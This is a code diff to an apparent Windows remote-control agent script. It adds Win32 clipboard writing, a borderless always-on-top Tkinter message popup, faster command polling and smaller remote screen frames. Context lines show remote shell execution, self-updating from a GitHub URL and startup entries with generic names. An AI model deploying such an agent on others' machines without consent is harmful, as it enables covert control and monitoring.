@@ -50,7 +50,34 @@ SendInput = ctypes.windll.user32.SendInput
 SetCursorPos = ctypes.windll.user32.SetCursorPos
 GetWindowTextLengthW = ctypes.windll.user32.GetWindowTextLengthW
 GetWindowTextW = ctypes.windll.user32.GetWindowTextW
+CloseClipboard = ctypes.windll.user32.CloseClipboard
+EmptyClipboard = ctypes.windll.user32.EmptyClipboard
+OpenClipboard = ctypes.windll.user32.OpenClipboard
+SetClipboardData = ctypes.windll.user32.SetClipboardData
+GlobalAlloc = ctypes.windll.kernel32.GlobalAlloc
+GlobalLock = ctypes.windll.kernel32.GlobalLock
+GlobalUnlock = ctypes.windll.kernel32.GlobalUnlock
+RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
 WM_CLOSE = 0x0010
+CF_UNICODETEXT = 13
+GMEM_MOVEABLE = 0x0002
+
+OpenClipboard.argtypes = [ctypes.wintypes.HWND]
+OpenClipboard.restype = ctypes.wintypes.BOOL
+CloseClipboard.argtypes = []
+CloseClipboard.restype = ctypes.wintypes.BOOL
+EmptyClipboard.argtypes = []
+EmptyClipboard.restype = ctypes.wintypes.BOOL
+SetClipboardData.argtypes = [ctypes.wintypes.UINT, ctypes.wintypes.HANDLE]
+SetClipboardData.restype = ctypes.wintypes.HANDLE
+GlobalAlloc.argtypes = [ctypes.wintypes.UINT, ctypes.c_size_t]
+GlobalAlloc.restype = ctypes.wintypes.HGLOBAL
+GlobalLock.argtypes = [ctypes.wintypes.HGLOBAL]
+GlobalLock.restype = ctypes.c_void_p
+GlobalUnlock.argtypes = [ctypes.wintypes.HGLOBAL]
+GlobalUnlock.restype = ctypes.wintypes.BOOL
+RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
+RtlMoveMemory.restype = None
 
 
 # Edit these values first.
@@ -61,7 +88,7 @@ DEFAULT_AGENT_UPDATE_URL = os.environ.get(
     "https://raw.githubusercontent.com/pureoffic2/comfyUIAgent/main/pc_agent.py",
 ).strip()
 HEARTBEAT_INTERVAL_SECONDS = max(4.0, float(os.environ.get("PCBOT_HEARTBEAT_INTERVAL", "8")))
-COMMAND_POLL_SECONDS = max(0.05, float(os.environ.get("PCBOT_COMMAND_POLL", "0.08")))
+COMMAND_POLL_SECONDS = max(0.02, float(os.environ.get("PCBOT_COMMAND_POLL", "0.03")))
 HTTP_TIMEOUT_SECONDS = max(5, int(os.environ.get("PCBOT_HTTP_TIMEOUT", "12")))
 WIFI_RECOVERY_COOLDOWN_SECONDS = max(10.0, float(os.environ.get("PCBOT_WIFI_RECOVERY_COOLDOWN", "35")))
 WIFI_CONNECT_SETTLE_SECONDS = max(3.0, float(os.environ.get("PCBOT_WIFI_CONNECT_SETTLE", "6")))
@@ -72,9 +99,9 @@ SHELL_COMMAND_CWD = str(Path.home())
 SHELL_COMMAND_PREVIEW_CHARS = 1600
 DEFAULT_STARTUP_ENTRY_NAME = "SystemPortalAgent"
 LEGACY_STARTUP_ENTRY_NAMES = ("SafePcTelegramAgent", "SchoolProAgent")
-REMOTE_FRAME_MAX_WIDTH = 960
-REMOTE_FRAME_MAX_HEIGHT = 540
-REMOTE_FRAME_QUALITY = 34
+REMOTE_FRAME_MAX_WIDTH = 800
+REMOTE_FRAME_MAX_HEIGHT = 450
+REMOTE_FRAME_QUALITY = 26
 STANDARD_SCREENSHOT_MAX_WIDTH = 1600
 STANDARD_SCREENSHOT_MAX_HEIGHT = 900
 STANDARD_SCREENSHOT_QUALITY = 72
@@ -1420,27 +1447,28 @@ def chord_ctrl_v() -> None:
 
 
 def set_clipboard_text(text: str) -> None:
-    completed = subprocess.run(
-        [
-            "powershell.exe",
-            "-NoProfile",
-            "-Command",
-            "Set-Clipboard -Value ([Console]::In.ReadToEnd())",
-        ],
-        input=text,
-        text=True,
-        encoding="utf-8",
-        check=False,
-        capture_output=True,
-        timeout=8,
-        **hidden_subprocess_kwargs(),
-    )
-    if completed.returncode != 0:
-        raise RuntimeError(
-            decode_process_output(completed.stderr)
-            or decode_process_output(completed.stdout)
-            or "Set-Clipboard failed"
-        )
+    payload = ctypes.create_unicode_buffer(text + "\x00")
+    payload_size = ctypes.sizeof(payload)
+    handle = GlobalAlloc(GMEM_MOVEABLE, payload_size)
+    if not handle:
+        raise RuntimeError("Не удалось выделить память под буфер обмена.")
+    locked = GlobalLock(handle)
+    if not locked:
+        raise RuntimeError("Не удалось открыть память буфера обмена.")
+    try:
+        RtlMoveMemory(locked, ctypes.byref(payload), payload_size)
+    finally:
+        GlobalUnlock(handle)
+    if not OpenClipboard(None):
+        raise RuntimeError("Не удалось открыть буфер обмена.")
+    try:
+        if not EmptyClipboard():
+            raise RuntimeError("Не удалось очистить буфер обмена.")
+        if not SetClipboardData(CF_UNICODETEXT, handle):
+            raise RuntimeError("Не удалось записать Unicode-текст в буфер обмена.")
+        handle = None
+    finally:
+        CloseClipboard()
 
 
 def type_text_into_active_window(text: str) -> None:
@@ -1823,34 +1851,63 @@ def show_text_popup(text: str) -> dict[str, Any]:
 
 
 def render_popup_window(text: str) -> None:
-    lines = [line[:220] for line in text.replace("\r\n", "\n").splitlines()][:24]
-    printable = "\r\n".join(lines) or text[:220]
-    script_path = Path(tempfile.gettempdir()) / f"systemportal_text_{os.getpid()}_{int(time.time())}.cmd"
-    script_path.write_text(
-        "\r\n".join(
-            [
-                "@echo off",
-                "chcp 65001 >nul",
-                "title SystemPortal",
-                "mode con cols=92 lines=24",
-                "color 0F",
-                "echo.",
-                "echo ======================= SystemPortal =======================",
-                "echo.",
-                *[f"echo {line}" for line in printable.splitlines()],
-                "echo.",
-                f"timeout /t {TEXT_WINDOW_SECONDS} /nobreak >nul",
-                f'del "{script_path}" >nul 2>&1',
-                "",
-            ]
-        ),
-        encoding="utf-8",
+    if "tk" not in globals():
+        raise RuntimeError("Tkinter недоступен для показа текста.")
+    value = text.replace("\r\n", "\n").strip()
+    if not value:
+        value = " "
+    root = tk.Tk()
+    root.overrideredirect(True)
+    root.attributes("-topmost", True)
+    root.configure(bg="#09090b")
+    root.wm_attributes("-alpha", 0.96)
+    screen_w = root.winfo_screenwidth()
+    screen_h = root.winfo_screenheight()
+    width = min(880, max(520, screen_w - 220))
+    height = min(340, max(180, screen_h // 3))
+    pos_x = max((screen_w - width) // 2, 24)
+    pos_y = max((screen_h - height) // 3, 24)
+    root.geometry(f"{width}x{height}+{pos_x}+{pos_y}")
+
+    shell = tk.Frame(root, bg="#111827", highlightthickness=2, highlightbackground="#38bdf8")
+    shell.pack(fill="both", expand=True)
+    top = tk.Frame(shell, bg="#111827", padx=18, pady=14)
+    top.pack(fill="x")
+    body = tk.Frame(shell, bg="#111827", padx=18, pady=10)
+    body.pack(fill="both", expand=True)
+
+    title = tk.Label(top, text="Сообщение", fg="#f8fafc", bg="#111827", font=("Segoe UI Semibold", 16))
+    title.pack(side="left")
+    close_btn = tk.Button(
+        top,
+        text="×",
+        command=root.destroy,
+        bg="#111827",
+        fg="#e5e7eb",
+        relief="flat",
+        borderwidth=0,
+        activebackground="#1f2937",
+        activeforeground="#ffffff",
+        font=("Segoe UI", 18),
+        padx=10,
+        pady=0,
     )
-    subprocess.Popen(
-        ["cmd.exe", "/c", "start", "SystemPortal", "cmd.exe", "/k", str(script_path)],
-        shell=False,
-        cwd=str(BASE_DIR),
+    close_btn.pack(side="right")
+
+    label = tk.Label(
+        body,
+        text=value,
+        fg="#f3f4f6",
+        bg="#111827",
+        justify="left",
+        anchor="nw",
+        wraplength=width - 70,
+        font=("Segoe UI", 22),
     )
+    label.pack(fill="both", expand=True)
+
+    root.after(TEXT_WINDOW_SECONDS * 1000, root.destroy)
+    root.mainloop()
 
 
 def maybe_recover_wifi(last_attempt_at: float, reason: str, force: bool = False) -> tuple[float, str | None]:
